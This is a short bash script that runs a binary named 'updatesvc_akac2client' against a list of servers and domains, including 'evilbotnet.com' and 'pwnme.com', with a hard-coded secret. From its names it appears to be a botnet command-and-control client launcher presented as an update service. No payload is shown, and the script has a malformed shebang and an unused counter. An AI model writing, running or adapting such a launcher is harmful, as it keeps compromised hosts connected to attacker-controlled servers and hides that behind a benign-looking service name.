#/bin/bash
update_servers='server=10.10.10.1 domain=evilbotnet.com server=192.168.0.1 server=10.0.1.4 domain=pwnme.com'

i=0
for s in $update_servers
do
	i=$(($i+1))
	./updatesvc_akac2client --dns $s --secret=590J --max-retransmits=10
done